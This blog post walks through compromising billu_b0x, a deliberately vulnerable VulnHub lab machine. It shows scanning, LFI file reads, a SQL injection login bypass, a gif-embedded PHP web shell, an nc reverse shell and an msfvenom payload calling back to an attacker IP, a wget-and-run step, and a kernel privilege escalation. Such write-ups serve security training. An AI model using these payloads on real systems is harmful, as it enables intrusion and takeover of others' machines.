---
layout: post
title:  "billub0x: Vulnhub Walkthrough"
date:   2018-02-02 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [Manish Kishan Tanwar][2] and is part of a series called `billu`. Word from the author:
```
This Virtual machine is using ubuntu (32 bit)

Other packages used: -

PHP
Apache
MySQL
This virtual machine is having medium difficulty level with tricks.

One need to break into VM using web application and from there escalate privileges to gain root access
```
<!--more-->
## INFORMATION GATHERING
We need to establish which port its running on; we can use netdiscover or arp-scan;
`arp-scan -l -I eth0`

![9-1.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-1.png)
We go to the home page.
![9-2.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-2.png)
Since automation is the way to go. We'll use [nmapAutomator][4] a great tool by. Please feel free any other tool of choice.
Alternatively wecan just run -- python recon.py <ip> This will carry out various tests on the target.
```
root@marksmith:~# nmap -sV -O -oN /root/oscp/exam/192.168.109.129/192.168.109.129.nmap 192.168.109.129
Nmap scan report for 192.168.109.129
Host is up (0.00059s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:53:92:9E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

From the analysis we find that
- 22 OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0). We can probably tell what debian version it is.
We're running:
- Apache 2.2.22
- PHP 5.3.10-1 (How can we find this out)

A dirb scan of the site reveals the following web pages.
```
root@marksmith:~# dirb http://192.168.109.129

+ http://192.168.109.129:80/add (CODE:200|SIZE:307)
+ http://192.168.109.129:80/c (CODE:200|SIZE:1)
+ http://192.168.109.129:80/cgi-bin/ (CODE:403|SIZE:291)
+ http://192.168.109.129:80/head (CODE:200|SIZE:2793)
+ http://192.168.109.129:80/in (CODE:200|SIZE:47559)
+ http://192.168.109.129:80/index (CODE:200|SIZE:3267)
+ http://192.168.109.129:80/index.php (CODE:200|SIZE:3267)
+ http://192.168.109.129:80/panel (CODE:302|SIZE:2469)
+ http://192.168.109.129:80/server-status (CODE:403|SIZE:296)
+ http://192.168.109.129:80/show (CODE:200|SIZE:1)
+ http://192.168.109.129:80/test (CODE:200|SIZE:72)

```
Of interest is page `http://192.168.109.129:80/test`.   
We see other files are present which will be examined;
    __/add, /c, /head, /in, /index, /panel, /show__
Navigating to `/test` using curl we get an error;
```
root@marksmith:~# curl -v http://192.168.109.129/test
'file' parameter is empty. Please provide file path in 'file' parameter
```

We use curl to do a post to the file parameter `file=asdaf` and we get a different kind of error
```
root@marksmith:~# curl -v -d "file=asdaf" http://192.168.109.129/test
  ...
file not found
```
From this we can then attempt to check for LFI using directory traversal `../../etc/passwd`
```
root@marksmith:~# curl -d "file=../../etc/passwd" http://192.168.109.129/test
...
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    syslog:x:101:103::/home/syslog:/bin/false
    mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
    messagebus:x:103:106::/var/run/dbus:/bin/false
    whoopsie:x:104:107::/nonexistent:/bin/false
    landscape:x:105:110::/var/lib/landscape:/bin/false
    sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
    ica:x:1000:1000:ica,,,:/home/ica:/bin/bash

```
We see LFI is working thus we look for potentially useful files. Previously from dirb we know we have the following directories __/add, /c, /head, /in, /index, /panel, /show.__
When we examine all the files, four are found to be useful; ___index.php, in.php, c.php, test.php___

We'll start with `test.php.` This is where the primary vulnerability exists. It _only_ allows us to read the files.
Here's the code for `test.php`
```
root@marksmith:~# curl -d "file=test.php" http://192.168.109.146/test
<?php

function file_download($download)
{
if(file_exists($download))
{
header("Content-Description: File Transfer");

header('Content-Transfer-Encoding: binary');
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Pragma: public');
header('Accept-Ranges: bytes');
header('Content-Disposition: attachment; filename="'.basename($download).'"');
header('Content-Length: ' . filesize($download));
header('Content-Type: application/octet-stream');
ob_clean();
flush();
readfile ($download);
}
else
{
echo "file not found";
}

}

if(isset($_POST['file']))
{
file_download($_POST['file']);
}
else{

echo '\'file\' parameter is empty. Please provide file path in \'file\' parameter ';
}
```
If the file parameter isn't set. It gives an error message;
`'file' parameter is empty.` Please provide file path in 'file' parameter
If file is set and the file exists, it reads the contents of the file.
`readfile ($download);`

However no execution is possible.

Next we shall examine `/in.php`
```
root@marksmith:~# curl -d "file=in.php" http://192.168.109.146/test
<?php
    phpinfo();

?>
```
This will enable us to determine the webroot directory. If we navigate to /in.php we get phpinfo(), hence the web directory `/var/www/`

![9-4.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-4.png)

More on this later.

Next we shall examine `/c.php` :
```
root@marksmith:~# curl -d "file=c.php" http://192.168.109.146/test
<?php
#header( 'Z-Powered-By:its chutiyapa xD' );
header('X-Frame-Options: SAMEORIGIN');
header( 'Server:testing only' );
header( 'X-Powered-By:testing only' );

ini_set( 'session.cookie_httponly', 1 );

$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

// Check connection
if (mysqli_connect_errno())
  {
  echo "connection failed ->  " . mysqli_connect_error();
  }

?>
```
This gives some credentials for a database `"127.0.0.1","billu","b0x_billu","ica_lab"`

Earlier we noted that we running PHP. Could there be possibly a PHP admin page.
We run a more thorough dirb_scan.

_dirb http://192.168.109.129 /usr/share/dirb/wordlists/big.txt_

This returns the existence of a __phpmydmin__ site
`http://192.168.109.129/phpmy/`
We'll use the credentials to log in: `user:billu password:b0x_billu`

![9-5.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-5.png)

Navigate to the table called auth and get the credentials to log in to `/index.php`;

![9-6.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-6.png)

__user:biLLu
pass:hEx_it__

While we're here we tried to upload a shell but failed. This was done as follows;
```
SELECT "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/rs.php"
```

![9-7.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-7.png)

Alternatively we can gain access via SQL bypass. Let's examine the code for the `/index.php` page.
```
    $uname=str_replace('\'','',urldecode($_POST['un']));
    $pass=str_replace('\'','',urldecode($_POST['ps']));
    $run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    $result = mysqli_query($conn, $run);

    if (mysqli_num_rows($result) > 0) {
      $row = mysqli_fetch_assoc($result);
      echo "You are allowed<br>";
      $_SESSION['logged']=true;
      $_SESSION['admin']=$row['username'];
         
      header('Location: panel.php', true, 302);  
    }
```
From this we see that we're replacing the quotes `\' `with space `''`. The `\` is used as an escape sequence.
It then url decodes the username and payload.
We're using a direct sql statement for authentication.
Attempting to use sqlmap for injection fails.
We then make a direct attempt at bypass attempting to visualise how the query will look upon insertion.

    select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'

Resultant sql statement will look as follows;

    select * from auth where  pass='pw' and uname='user'

To bypass this we use the following parameters;

    uname: or 1=1 -- (make sure there is a space after the double hyphen; otherwise the injection fails)
    pass: \

The query actually becomes;

    select * from auth where  pass=" and uname=" or 1=1 --
We're in;

The quote now forms part of the password. This bypass works and we're into the authenticated section. We then try upload a reverse shell and we get:

![9-9.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-9.png)

It shows only the file types that are allowed. From here we can do uploads e.g. a gif
We'll generate a gif and append a payload to a gif (this should provides us with a proof of concept)

    echo 'FFD8FFEo' | xxd -r -p > my_img.gif
    echo '<?php phpinfo(); ?>' >> my_img.gif

![9-10.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-10.png)

Using `/test.php` for the LFI fails. Remember it only reads contents of a file.
Here's the code for `panel.php`.
```
root@marksmith:~# curl -d "file=panel.php" http://192.168.109.146/test  
<?php
session_start();

include('c.php');
include('head2.php');
if(@$_SESSION['logged']!=true )
{
header('Location: index.php', true, 302);
exit();

}

echo "Welcome to billu b0x ";
echo '<form method=post style="margin: 10px 0px 10px 95%;"><input type=submit name=lg value=Logout></form>';
if(isset($_POST['lg']))
{
unset($_SESSION['logged']);
unset($_SESSION['admin']);
header('Location: index.php', true, 302);
}
echo '<hr><br>';

echo '<form method=post>

<select name=load>
    <option value="show">Show Users</option>
<option value="add">Add User</option>
</select>

 &nbsp<input type=submit name=continue value="continue"></form><br><br>';
if(isset($_POST['continue']))
{
$dir=getcwd();
$choice=str_replace('./','',$_POST['load']);

if($choice==='add')
{
       include($dir.'/'.$choice.'.php');
die();
}

        if($choice==='show')
{
       
include($dir.'/'.$choice.'.php');
die();
}
else
{
include($dir.'/'.$_POST['load']);
}

}


if(isset($_POST['upload']))
{

$name=mysqli_real_escape_string($conn,$_POST['name']);
$address=mysqli_real_escape_string($conn,$_POST['address']);
$id=mysqli_real_escape_string($conn,$_POST['id']);

if(!empty($_FILES['image']['name']))
{
$iname=mysqli_real_escape_string($conn,$_FILES['image']['name']);
$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);
$image=array('jpeg','jpg','gif','png');
if(in_array($r,$image))
{
$finfo = @new finfo(FILEINFO_MIME);
$filetype = @$finfo->file($_FILES['image']['tmp_name']);
if(preg_match('/image\/jpeg/',$filetype )  || preg_match('/image\/png/',$filetype ) || preg_match('/image\/gif/',$filetype ))
{
if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
 {
  echo "Uploaded successfully ";
  $update='insert into users(name,address,image,id) values(\''.$name.'\',\''.$address.'\',\''.$iname.'\', \''.$id.'\')';
 mysqli_query($conn, $update);
  
}
}
else
{
echo "<br>i told you dear, only png,jpg and gif file are allowed";
}
}
else
{
echo "<br>only png,jpg and gif file are allowed";

}
}


}

?>
```
Its checks for authentication. Once youre authenticated it lets you access the page. If not you're redirected back to `index.php.`
This filechecker does two things;
1. Verifies the extension: This is trivial simply change the extension.
2. Checks the file type: We must modifiy the file type,

The function we want to exploit is;

    if(isset($_POST['continue']))
    {
    $dir=getcwd();
    $choice=str_replace('./','',$_POST['load']);

    if($choice==='add')
    {
           include($dir.'/'.$choice.'.php');
    die();
    }

            if($choice==='show')
    {
           
    include($dir.'/'.$choice.'.php');
    die();
    }
    else
    {
    include($dir.'/'.$_POST['load']);
    }

    }

There are three choices,
1. __add:__ This dies
2. __show:__ This dies
3. __load:__ This doesn't

_Note_ all three have the include function.
During execution the function will look like
![9-11.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-11.png)


This is what we'll exploit.
First we check the proof of concept.

![9-12.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-12.png)
![9-13.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-13.png)


We're now getting execution. Next we prepare the payload and upload it;

    echo 'FFD8FFEo' | xxd -r -p > giphy.gif
    echo '<?php system($_REQUEST["cmd"]); ?>' >> giphy.gif

__Note:__ There's no space between __?__ and __php.__ It has to be __'<?php'__ . Banged my head for hours on this. Only to realise the syntax was wrong.

## Low shell: method 1
We can get the reverse shell via 2 ways;
1. using nc

    ```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.227.135 1234 >/tmp/f
    ```

![9-14.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-14.png)

2. Using msfvenom and meterpreter.
    Generate the payload
    ```
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=1234 -f elf > shell.elf

    Start the listener
    use exploit/multi/handler
    set PAYLOAD linux/x86/meterpreter/reverse_tcp
    set LHOST 192.168.109.128
    set LPORT 1234
    set ExitOnSession false
    exploit -j -z
    ```
Get the payload;
From Burp
    POST /panel.php?cmd=wget http://192.168.109.128/shell.elf -O /tmp/shell.elf && chmod 744 /tmp/shell.elf && cd /tmp && ./shell.elf
    ...

    load=uploaded_images/shell.gif&continue=1
From this we get the meterpreter shell.

## Privilege Escalation
    run post/multi/recon/local_exploit_suggester
    upload /usr/share/exploitdb/platforms/linux/local/37292.c
    shell
    gcc 37292.c -o ofs
    chmod +x ofs
    whoami

Then you done.

## Low shell: method 2
We then google to find out the location of the config file.
![9-15.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-15.png)

When we get the low priv shell, looking around we found the __phpmyadmin__ config in `/phpmy`. The phpinfo file tells us webroot is `/var/www` putting the two together `/var/www/phpmy` Since we have a read file vulnerability we shall use it to read contents of the file.

    root@marksmith:~# curl -v -d "file=/var/www/phpmy/config.inc.php" http://192.168.109.129/test
    ...
    __$cfg['Servers'][$i]['user'] = 'root';__
    __$cfg['Servers'][$i]['password'] = 'roottoor';__
    $cfg['Servers'][$i]['AllowNoPassword'] = true;
    ....

    ?>

Better still we can

    root@marksmith:~# curl -v -d "file=/var/www/phpmy/config.inc.php" http://192.168.227.140/test 2>&1 | grep -i pass

![9-16.png](/assets/images/posts/billu-b0x-vulnhub-walkthrough/9-16.png)

Using these credentials we can ssh `user:root password:roottoor`  in to the box.
And boom we're in as the root.

 ssh root@192.168.109.129


Then we're in as root.

## Learnings
Its got LFI, re-used credentials from an abandoned CMS and being an old VM at time of writing we can throw some kernel exploits at it.
To exploit this machine we'll need to chain two different exploits.
At the end we'll also include some mitigation strategies. Without much further ado here we go.

[1]: https://www.vulnhub.com/entry/billu-b0x,188/
[2]: https://twitter.com/@indishell1046
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
